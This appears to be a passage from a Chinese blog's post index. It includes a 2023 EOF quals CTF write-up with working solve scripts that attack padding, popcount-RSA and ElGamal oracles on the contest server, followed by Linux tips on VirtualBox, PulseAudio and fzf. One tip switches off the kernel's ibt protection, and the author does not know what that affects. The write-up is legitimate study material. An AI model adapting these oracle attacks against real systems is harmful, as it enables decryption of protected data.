bytes([c ^ iv[j]]) + iv[j+1:] + ct # ct[:14] + bytes([c, d]) + suffix if ask(inp): possible.append(c) c = mp[str(possible)] ans += c print(ans) r.recvline() r.recvline() r.recvline() r.sendline(b\u0026#39;2\u0026#39;) r.sendafter(b\u0026#39;Token(hex): \u0026#39;, bytes(ans + \u0026#39;\\n\u0026#39;, \u0026#39;ascii\u0026#39;)) print(r.recv()) 不要 XOR 太大的數字或是修改 ct，不然直接不能被 utf-8 decode 就會斷線。\nLF3R 題目給了很像線性遞迴的東西，然後他的確是線性遞迴。\n用 BerlekampMassey 就解開ㄌ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\Q // \\###################\\Q // \\ ____ \\B // \\_______\\___\\_______\\X // An AC a day keeps the doctor away. // clang-format off /*{{{*/ #ifdef local // #define _GLIBCXX_DEBUG AC #include \u0026lt;bits/extc++.h\u0026gt; #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define TAK(args...) std::ostream\u0026amp; operator\u0026lt;\u0026lt;(std::ostream \u0026amp;O, args) #define NIE(STL, BEG, END, OUT) template \u0026lt;typename ...T\u0026gt; TAK(std::STL\u0026lt;T...\u0026gt; v) \\ { O \u0026lt;\u0026lt; BEG; int f=0; for(auto e: v) O \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; OUT; return O \u0026lt;\u0026lt; END; } NIE(deque, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, e) ; NIE(vector, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, e) NIE(set, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, e) ; NIE(multiset, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, e) ; NIE(unordered_set, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, e) NIE(map , \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, e.first \u0026lt;\u0026lt; \u0026#34;:\u0026#34; \u0026lt;\u0026lt; e.second) NIE(unordered_map , \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, e.first \u0026lt;\u0026lt; \u0026#34;:\u0026#34; \u0026lt;\u0026lt; e.second) template \u0026lt;typename ...T\u0026gt; TAK(std::pair\u0026lt;T...\u0026gt; p) { return O \u0026lt;\u0026lt; \u0026#39;(\u0026#39; \u0026lt;\u0026lt; p.first \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p.second \u0026lt;\u0026lt; \u0026#39;)\u0026#39;; } template \u0026lt;typename T, size_t N\u0026gt; TAK(std::array\u0026lt;T,N\u0026gt; a) { return O \u0026lt;\u0026lt; std::vector\u0026lt;T\u0026gt;(a.begin(), a.end()); } template \u0026lt;typename ...T\u0026gt; TAK(std::tuple\u0026lt;T...\u0026gt; t) { return O \u0026lt;\u0026lt; \u0026#34;(\u0026#34;, std::apply([\u0026amp;O](T ...s){ int f=0; (..., (O \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; s)); }, t), O \u0026lt;\u0026lt; \u0026#34;)\u0026#34;; } template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); if(!cnt) return std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m() = ()\\033\\[0m\\n\u0026#34;, void(); (std::cerr \u0026lt;\u0026lt; \u0026#34;\\033[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34; , ... , (std::cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\033[0m\\n\u0026#34;))); } #else #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #include \u0026lt;bits/stdc++.h\u0026gt; #define debug(...) ((void)0) #define safe ((void)0) #endif // local #define pb emplace_back #define all(v) begin(v),end(v) #define mem(v,x) memset(v,x,sizeof v) #define ff first #define ss second template \u0026lt;typename T, T MOD\u0026gt; class Modular { public: constexpr Modular() : v() {} template \u0026lt;typename U\u0026gt; Modular(const U \u0026amp;u) { v = (0 \u0026lt;= u \u0026amp;\u0026amp; u \u0026lt; MOD ? u : (u%MOD+MOD)%MOD); } template \u0026lt;typename U\u0026gt; explicit operator U() const { return U(v); } T operator()() const { return v; } #define REFOP(type, expr...) Modular \u0026amp;operator type (const Modular \u0026amp;rhs) { return expr, *this; } REFOP(+=, v += rhs.v - MOD, v += MOD \u0026amp; (v \u0026gt;\u0026gt; width)) ; REFOP(-=, v -= rhs.v, v += MOD \u0026amp; (v \u0026gt;\u0026gt; width)) // fits for MOD^2 \u0026lt;= 9e18 REFOP(*=, v = static_cast\u0026lt;T\u0026gt;(1LL * v * rhs.v % MOD)) ; REFOP(/=, *this *= inverse(rhs.v)) #define VALOP(op) friend Modular operator op (Modular a, const Modular \u0026amp;b) { return a op##= b; } VALOP(+) ; VALOP(-) ; VALOP(*) ; VALOP(/) Modular operator-() const { return 0 - *this; } friend bool operator == (const Modular \u0026amp;lhs, const Modular \u0026amp;rhs) { return lhs.v == rhs.v; } friend bool operator != (const Modular \u0026amp;lhs, const Modular \u0026amp;rhs) { return lhs.v != rhs.v; } friend std::istream \u0026amp; operator\u0026gt;\u0026gt;(std::istream \u0026amp;I, Modular \u0026amp;m) { T x; I \u0026gt;\u0026gt; x, m = x; return I; } friend std::ostream \u0026amp; operator\u0026lt;\u0026lt;(std::ostream \u0026amp;O, const Modular \u0026amp;m) { return O \u0026lt;\u0026lt; m.v; } private: constexpr static int width = sizeof(T) * 8 - 1; T v; static T inverse(T a) { // copy from tourist\u0026#39;s template T u = 0, v = 1, m = MOD; while (a != 0) { T t = m / a; m -= t * a; std::swap(a, m); u -= t * v; std::swap(u, v); } assert(m == 1); return u; } }; using namespace std; using namespace __gnu_pbds; typedef int64_t ll; typedef long double ld; typedef pair\u0026lt;ll,ll\u0026gt; pll; typedef pair\u0026lt;ld,ld\u0026gt; pld; template \u0026lt;typename T\u0026gt; using max_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,less\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using min_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,greater\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; template \u0026lt;typename V, typename T\u0026gt; int get_pos(const V \u0026amp;v, T x) { return lower_bound(all(v),x) - begin(v); } template \u0026lt;typename V\u0026gt; void sort_uni(V \u0026amp;v) { sort(all(v)), v.erase(unique(all(v)),end(v)); } template \u0026lt;typename T\u0026gt; bool chmin(T \u0026amp;x, const T \u0026amp;v) { return v \u0026lt; x ? (x=v, true) : false; } template \u0026lt;typename T\u0026gt; bool chmax(T \u0026amp;x, const T \u0026amp;v) { return x \u0026lt; v ? (x=v, true) : false; } constexpr inline ll cdiv(ll x, ll m) { return x/m + (x%m ? (x\u0026lt;0) ^ (m\u0026gt;0) : 0); } // ceiling divide constexpr inline ll modpow(ll e,ll p,ll m) { ll r=1; for(e%=m;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r; } /*}}}*/ constexpr ld PI = acos(-1), eps = 1e-7; constexpr ll maxn = 500025, INF = 1e18, mod = 1000000007, K = 14699, inf = 1e9; using Mint = Modular\u0026lt;int, mod\u0026gt;; Mint modpow(Mint e, uint64_t p) { Mint r = 1; while(p) (p\u0026amp;1) \u0026amp;\u0026amp; (r *= e), e *= e, p \u0026gt;\u0026gt;= 1; return r; } // 0^0 = 1 // clang-format on namespace linear_recurrence { template \u0026lt;typename T\u0026gt; vector\u0026lt;T\u0026gt; BerlekampMassey(vector\u0026lt;T\u0026gt; a) { auto scalarProduct = [](vector\u0026lt;T\u0026gt; v, T c) { for (T\u0026amp; x : v) x *= c; return v; }; vector\u0026lt;T\u0026gt; s, best; int bestPos = -1; for (size_t i = 0; i \u0026lt; a.size(); i++) { T error = a[i]; for (size_t j = 0; j \u0026lt; s.size(); j++) error -= s[j] * a[i - 1 - j]; if (error == 0) continue; vector\u0026lt;T\u0026gt; fix = scalarProduct(best, error); fix.insert(fix.begin(), i - bestPos, 0); if (fix.size() \u0026gt;= s.size()) { best = scalarProduct(s, -1 / error); best.insert(best.begin(), 1 / error); bestPos = i + 1; s.resize(fix.size()); } for (size_t j = 0; j \u0026lt; fix.size(); j++) s[j] += fix[j]; } return s; } template \u0026lt;typename T\u0026gt; T deduce(vector\u0026lt;T\u0026gt; a, int64_t n) { vector\u0026lt;T\u0026gt; s = BerlekampMassey(a); if (s.empty()) return 0; // a[i] = \\sum s[j] * a[i-j-1] vector\u0026lt;T\u0026gt; r = {1}; // 1 vector\u0026lt;T\u0026gt; e = {0, 1}; // x; auto mul = [\u0026amp;s](vector\u0026lt;T\u0026gt; a, vector\u0026lt;T\u0026gt; b) { // return a * b % (x^m - s) vector\u0026lt;T\u0026gt; c(a.size() + b.size() - 1); for (size_t i = 0; i \u0026lt; a.size(); i++) for (size_t j = 0; j \u0026lt; b.size(); j++) c[i + j] += a[i] * b[j]; for (size_t i = c.size() - 1; i \u0026gt;= s.size(); i--) for (size_t j = 0; j \u0026lt; s.size(); j++) c[i - j - 1] += c[i] * s[j]; c.resize(s.size()); return c; }; while (n) { if (n \u0026amp; 1) r = mul(r, e); e = mul(e, e); n \u0026gt;\u0026gt;= 1; } T sum = 0; for (size_t j = 0; j \u0026lt; r.size(); j++) sum += r[j] * a[j]; return sum; } } // namespace linear_recurrence signed main() { ios_base::sync_with_stdio(false); cin.tie(nullptr); vector\u0026lt;Modular\u0026lt;int,2\u0026gt;\u0026gt; arr = { 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1 }; // from output.py debug(arr.size()); reverse(arr.begin(), arr.end()); auto ini = vector\u0026lt;Modular\u0026lt;int,2\u0026gt;\u0026gt;(arr.begin(), arr.begin() + 300); auto s = linear_recurrence::BerlekampMassey(ini); for (int i = 300; i \u0026lt; arr.size(); i++) { ini.push_back(0); for (int j = 0; j \u0026lt; s.size(); j++) ini[i] += ini[i - j - 1] * s[j]; arr[i] += ini[i]; // arr[j] += linear_recurrence::deduce(ini, j); } reverse(arr.begin(), arr.end()); int sum = 0; for (int j = 0; j \u0026lt; arr.size() - 300; j++) { if (j % 8 == 0) arr[j] = 0; cout \u0026lt;\u0026lt; arr[j]; sum += (arr[j]() \u0026lt;\u0026lt; (7 - j % 8)); if (j % 8 == 7) { cout \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; char(sum); sum = 0; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } popcnt 題目\n給你 flag 經過 RSA 加密後的結果，然後你可以詢問任意數字解密過後的 popcnt。\n有一個有趣的地方是一次連線會隨機生成 10 對密鑰，flag 用這 10 對公鑰加密的結果（enc[i]）都會告訴你，而且詢問任意數字解密過後的 popcnt 也可以針對任意一對密鑰。\n每對密鑰的公鑰 $e_i$以及 $N_i$ 都會告訴你。\n把 flag 寫作 $x$，因為 RSA 加密是 $x^e \\pmod N$的特性，我們可以問 enc[i] * pow(c, e, n) % n 就能得到 $cx \\% N$ 的 popcnt。\n考慮 $x \\% N$ 和 $2x \\% N$。$2x \\% N$ 沒有進位的話，popcnt 一定會跟 $x \\% N$ 的 popcnt 相同，否則有足夠大的機率 popcnt 會不一樣（我猜剛好一樣的機率可能是 1/1000 之類的量級）\n所以我們可以用很高的機率得知 $x$ 是 $\\leq N/2$ 還是 $\u0026gt; N/2$。\n以此類推我們可以比較 $2^i x \\% N$ 和 $2^{i+1} x \\% N$ 的 popcnt 就能大概猜出 $2^i x \\% N$ 與 $N/2$ 的大小關係。\n這等於是問說 $\\lfloor \\frac{x}{N/{2^{i+1}}} \\rfloor$ 的奇偶性之類的\n所以我們可以用類似二分搜的方式找到答案。\n不過，要注意 popcnt 相同還是有夠大的機率會發生的，我們可以利用一次連線有 10 對密鑰且隨機的特性把這些不常發生的錯誤過濾掉。\n我最後的寫法是：\n有兩個變數 $L, R$ 表示 flag 一定落在 $[L, R]$ 之間。 所有人獨立的做 5 輪二分搜得到新的 $[l_i, r_i]$。一次二分搜的輪數有點微妙，不能太大讓一次太多人一起發生錯誤，也不能太小以致於下一個步驟沒有足夠多的資訊辨別出是誰壞掉（？）一開始挑 20 後來改成 5，我覺得 5 應該還不錯。 把太小跟太大的丟掉，剩下的聯集起來，得到新的 $[L, R]$。 理論上因為做了 5 輪所以區間長度會縮減為 1/32 倍之類的 如果區間長度縮減不到 0.1 倍，那大概壞掉太多了，重新連線但不重設 $[L, R]$。不重設很重要，因為是有蠻大的機率在搜到某一段的時候每對都壞掉的，但不同連線得到的 $[L, R]$ 應該要 consistent 所以我們可以原地復活（題目有幫 flag pad 一些 random 的值但不太重要）。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 from pwn import * from Crypto.Util.number import bytes_to_long, long_to_bytes from base64 import b64encode, b64decode from fractions import Fraction from tqdm import tqdm import pickle # context.log_level = \u0026#39;debug\u0026#39; def init(): global r, ks, mp # r = process([\u0026#39;python\u0026#39;, \u0026#39;./popcnt.py\u0026#39;]) r = remote(\u0026#39;eof.ais3.org\u0026#39;, 10051) ks = [] mp = {} for i in range(10): n = bytes_to_long(b64decode(r.recvline().strip())) e = bytes_to_long(b64decode(r.recvline().strip())) enc = bytes_to_long(b64decode(r.recvline().strip())) mp[n] = i ks.append(((n, e), enc)) assert e == 65537 # print(n[i], enc[i]) init() def raw_ask(i, num): r.recvline() r.recvline() r.sendline(b\u0026#39;1\u0026#39;) r.sendafter(b\u0026#39;To: \u0026#39;, bytes(str(i) + \u0026#39;\\n\u0026#39;, \u0026#39;ascii\u0026#39;)) r.sendafter(b\u0026#39;Message: \u0026#39;, b64encode(long_to_bytes(num)) + b\u0026#39;\\n\u0026#39;) return int(r.recvline().strip()) def ask(n, i): j = mp[n] (n, e), enc = ks[j] return raw_ask(j, enc * pow(2, i * 65537, n) % n) def reduce(n, L, R, i): B = Fraction(n, (2 ** (i + 1))) if abs(L // B - R // B) \u0026gt;= 2: pass if abs(L // B - R // B) == 0: return L, R M = (L // B) + 1 # print(f\u0026#39;{M = }\u0026#39;) # print(f\u0026#39;{int(B) = }\u0026#39;) # print(f\u0026#39;{int(L) = }\u0026#39;) # print(f\u0026#39;{int(R) = }\u0026#39;) if (M % 2 == 0) ^ (ask(n, i) == ask(n, i + 1)): return L, M * B else: return M * B, R L = 0 R = 1 \u0026lt;\u0026lt; 512 prog = [] while R - L \u0026gt; 1: prog.append((L, R)) tlrs = [] for j in tqdm(range(10)): n, e = ks[j][0] i = max(0, int(n / (R - L)).bit_length() - 1) tL, tR = L, R for x in range(5): tL, tR = reduce(n, tL, tR, i + x) tlrs.append((tL, tR)) tmp = [] for tL, tR in tlrs: tmp.append(tL) tmp.append(tR) tmp = sorted(tmp)[2:-2] nL, nR = tmp[0], tmp[-1] # if not (nL \u0026lt;= flag \u0026lt;= nR): # print(\u0026#39;failed\u0026#39;) # mL = min([t[0] for t in tlrs]) # mR = max([t[1] for t in tlrs]) # for tL, tR in tlrs: # sL = float((tL - mL) / (mR - mL)) # sR = float((tR - mL) / (mR - mL)) # print(min(abs(flag-tL), abs(flag-tR)) \u0026lt;= (tR-tL)/2, sL, sR) # print(R - L) # print(long_to_bytes(int((L+R)/2))) # exit(-1) print(\u0026#39;shrink\u0026#39;, float((nR - nL) / (R - L))) if (float((nR - nL) / (R - L))) \u0026gt;= 0.1: print(\u0026#39;failed!\u0026#39;) r.close() init() continue L, R = nL, nR M = (L+R) / 2 print(long_to_bytes(int(M))) # print(float(L), float(flag), float(R)) # print(L, R) el2dlog 這題的變數好多，整理起來大概可以這樣講：\n隨機生成 1024 bit 質數 $p_1, q_1$，乘起來得到 $N$。\n隨機生成 2048 bit 質數 $p_2$\n隨機生成 $g_1$，保證 $g_1$ 是 $N$ 的二次剩餘且 $\\gcd(N, g_1) = 1$。\n隨機生成 $g_2, d, k \\in [2, p_2-2]$\n告訴你 $N = p_1 q_1$\n告訴你 $c_1 = g_2 ^ k \\% p_2$\n告訴你 $c_2 = g_2 ^ {dk} \\cdot x \\% p_2$。（$x$ 是我們要求的 flag）\n我們每次可以丟出兩個數字 $e_1, e_2$ 可以得到 $g^m \\% N$ 的結果，其中 $m = {(e_1 ^ {-d} \\cdot e_2) \\% {p_2}}$\n另外我們還會知道一個變數 hint，其值為 p2 \u0026gt;\u0026gt; 1024。\n一開始覺得比較 trivial 的東西是可以直接問 1,1 得到 $g_1$，然後就可以二分搜得知 $p_2$ 精確是多少了，不過就不知道怎麼繼續做。\n想了蠻久的，隊友表示這好像可以用跟前一題類似的作法解決。\n注意到如果我們把 $c_1, c_2$ 丟回去詢問，那麼我們就可以得到 $g_1 ^ x$ 的結果了（$x$ 就是我們要求的 flag，不失一般性假設 $x \u0026lt; p_2$），但這個數字量級解不了離散對數，可是我們可以把 $e_2$ 乘上一個數字 $z$ 就能讓 $m = zx \\% p_2$。\n因為 $p_2 \\neq \\varphi(N)$（照原本的 source code $p_2$ 似乎略大於 $\\varphi(N)$ 但只要不等於應該都對），我們可以從 $(g_1 ^ {zx\\%p_2}) ^ 2$ 與 $g_1 ^ {(2zx\\%p_2)}$ 是否一樣得知 $zx\\%p_2$ 是否 $\\leq p_2 / 2$。\n一樣問 2 的冪次就可以得到 flag 了\n然後有趣的地方是我們其實不需要知道 $p_2$ 是多少，問了也只是白白浪費時間。\n只需要把 p2 當成 hint \u0026lt;\u0026lt; 1024 就有足夠的精度了。\n這題的 timeout 似乎是五分鐘，一開始我有問出 p2 並且使用 p2，不過超時了所以就壓了一點詢問次數到約 1000 次，但還是剛好超時一點點，後來我把網路從 csie 換成 csie-5G 就輕鬆過了 XD\n直接從每秒 2~3 個 request 變成每秒十幾個 request。\n最後的 script：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 from pwn import * from Crypto.Util.number import bytes_to_long, long_to_bytes, isPrime from base64 import b64encode, b64decode from tqdm import tqdm from fractions import Fraction # context.log_level = \u0026#39;debug\u0026#39; # r = process([\u0026#39;python\u0026#39;, \u0026#39;./el2dlog.py\u0026#39;]) r = remote(\u0026#39;eof.ais3.org\u0026#39;, 10052) n = int(r.recvline().strip().split(b\u0026#39; \u0026#39;)[-1]) c1 = int(r.recvline().strip().split(b\u0026#39; \u0026#39;)[-1]) c2 = int(r.recvline().strip().split(b\u0026#39; \u0026#39;)[-1]) hint = int(r.recvline().strip().split(b\u0026#39; \u0026#39;)[-1]) print(f\u0026#39;{n = }\u0026#39;) print(f\u0026#39;{c1 = }\u0026#39;) print(f\u0026#39;{c2 = }\u0026#39;) # p2 = 0 def ask(e1, e2): r.sendafter(b\u0026#39;c1 = \u0026#39;, bytes(str(e1) + \u0026#39;\\n\u0026#39;, \u0026#39;ascii\u0026#39;)) r.sendafter(b\u0026#39;c2 = \u0026#39;, bytes(str(e2) + \u0026#39;\\n\u0026#39;, \u0026#39;ascii\u0026#39;)) return int(r.recvline()) g1 = ask(1, 1) print(f\u0026#39;{g1 = }\u0026#39;) # #### get p2 # # p2 = hint \u0026lt;\u0026lt; 1024 # # for i in tqdm(range(1024, -1, -1)): # if ask(1, p2 + (1 \u0026lt;\u0026lt; i)) == pow(g1, p2 + (1 \u0026lt;\u0026lt; i), n): # p2 += (1 \u0026lt;\u0026lt; i) # p2 += 1 # # assert isPrime(p2) # # assert ((p2 \u0026gt;\u0026gt; 1024) == hint) #### get flag lst = [] A = ask(c1, c2 * pow(2, 0)) B = ask(c1, c2 * pow(2, 250)) C = ask(c1, c2 * pow(2, 1024)) assert pow(A, pow(2, 250), n) == B assert pow(A, pow(2, 1024), n) == C # highbit 都是 0 先跳過 for i in range(1024): if i == 0: lst.append(A) else: lst.append(lst[-1] ** 2 % n) for i in tqdm(range(2048 - 1024)) # 一開始是問 c1, c2*pow(2,i,p2)%p2 但沒有必要模 p2 lst.append( ask(c1, c2 * pow(2, i + 1024)) ) M = Fraction(hint \u0026lt;\u0026lt; 1024, 2) ans = 0 for i in range(2048 - 1): if lst[i]*lst[i]%n != lst[i+1]: ans += M M *= Fraction(1, 2) for s in range(-5, 5): print(long_to_bytes(int(ans + s))) 這題也是在 local test 發現這種美好的 code 會跑出答案很驚訝的一題\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 lst = [] for i in tqdm(range(2048)): lst.append( ask(c1, c2 * pow(2, i) ) ) M = Fraction(p2, 2) ans = 0 for i in range(2048 - 1): if lst[i]*lst[i]%n != lst[i+1]: ans += M M *= Fraction(1, 2) print(int(ans), flag) print(int(ans - flag)) print(float(Fraction(ans, flag))) ","permalink":"https://omeletwithoutegg.github.io/2023/01/13/2023-eof-quals/","tags":["CTF","math"],"title":"2023 EOF quals"},{"contents":"VirtualBox cannot start 最近想要用 virtual box 開一些 virtual machine，在上學期還好好地 work 但這學期不知道什麼時刻就不打算動了（？）\n因為學期中很忙所以感覺很難找時間好好調查它，今天終於花時間來解決這個問題。\ncontext 打開 virtual box，想要 start 一個 VM 就會進入無限等待它的情況，而且還很難關掉它。\nsolution 使用\n1 sudo journalctl -b 看 log 發現在 start VM 的時刻有跳一個 error 是寫說 trap 之類的，長得大概很像這行\nkernel: kernel BUG at arch/x86/kernel/traps.c:252! 拿去搜尋之後搜尋到一個完全不同的東西但是是幾乎一樣的 error message 的類似東西有在討論問題，看起來是在某個版本之後，linux 的 kernel parameter 中 ibt 被預設開啟了，把這個參數手動調成 off 就可以解決這個問題了。\n以 systemd-boot 為例，可以在後面加上 ibt=off 的參數就可以關掉了。disclaimer: 我也不知道有什麼影響。\ntitle Arch Linux linux /vmlinuz-linux initrd /initramfs-linux.img options root=PARTUUID=blablablabla rw loglevel=3 quiet ibt=off Reference https://github.com/umlaeute/v4l2loopback/issues/476\nhttps://forums.developer.nvidia.com/t/error-in-kernel-boot-kernel-bug-at-arch-x86-kernel-traps-c-252/220443\nhttps://github.com/NVIDIA/open-gpu-kernel-modules/issues/256\nhttps://www.reddit.com/r/archlinux/comments/v0x3c4/psa_if_you_run_kernel_518_with_nvidia_pass_ibtoff/\nhttps://wiki.archlinux.org/title/Kernel_parameters\n","permalink":"https://omeletwithoutegg.github.io/2022/12/24/vbox-ibt/","tags":["arch","linux"],"title":"VirtualBox cannot start"},{"contents":"mpv suspends pulseaudio sink mpv 是一個簡單、輕量的 media player。\nDescription 最近在用 mpv 播放影片的時候發現有時候暫停 youtube 的影片用 mpv 一下下再轉回去瀏覽器，就瘋狂轉圈圈然後表示「如果經過一段時間仍未開始播放，請試著重新啟動您的裝置」\nSolution 找 log 找了很久究竟誰是犯人， systemctl restart --user pulseaudio 之後影片就可以播了所以確定犯人是它。\n1 systemctl status --user pulseaudio 然後就是一大堆的 Failed to create sink input: sink is suspended.\n拿去搜尋得知應該是因為 pulseaudio 預設有打開某種 idle 時候自動 suspend 的機制，改掉預設的 config file 就可以了\n1 vim /etc/pulse/default.pa ... ### Automatically suspend sinks/sources that become idle for too long #load-module module-suspend-on-idle # comment this ... Another solution 看 Reference 那篇有說到安裝 pipewire-pulse 也可以解決問題，目前試起來沒什麼問題。\n我覺得這個方法看起來比較乾淨。\nReference https://wiki.archlinux.org/title/Mpv\nhttps://unix.stackexchange.com/questions/114602/pulseaudio-sink-always-suspended\n","permalink":"https://omeletwithoutegg.github.io/2022/12/21/mpv-pulseaudio/","tags":["arch","linux"],"title":"pulseaudio problems with mpv"},{"contents":"FZF fuzzy finder fzf 是一個通用的模糊搜尋（fuzzy find）工具，用 go 寫成。\n很久以前就聽過它了，但以為自己不太需要這種東西。\n前陣子在尋找類似於 zsh-history-substring-search 的工具，也就是我可以打一些關鍵的字之後讓 zsh 從歷史紀錄裡面找類似的指令幫我貼到 shell 裡面。\n而這個功能我認為我目前找到用起來最順手的就是 fzf 的 history widget 了。\n安裝 可以用 linux distro 提供的 package manager 安裝\n1 sudo pacman -S fzf 1 sudo apt-get install fzf 1 brew install fzf 或者也可以透過 vim 的 plugin manager 作為一個 vim 的 plugin 安裝。\n1 Plug \u0026#39;junegunn/fzf\u0026#39;, { \u0026#39;do\u0026#39;: { -\u0026gt; fzf#install() } } （我個人比較不喜歡這樣的方法）\n要在 shell 當中使用以下提到的快捷鍵的話，你必須在 .bashrc/.zshrc 當中 source 由你選擇的安裝方法提供的 keybind script。\n以 Archlinux 來說會被放在 /usr/share/fzf/key-bindings.zsh，而用 vim 安裝的應該會放在 ~/.fzf.zsh 之類的。\n簡單用法 fzf 比較一般化的用法是用別的程式的輸出 pipe 到 fzf，然後 fzf 會跳出一個 TUI 介面讓我們模糊搜尋，按下 enter 應該等於是選擇該行項目，會被印到標準輸出當中。\n例如 curl XXXXX.content.pkg | fzf 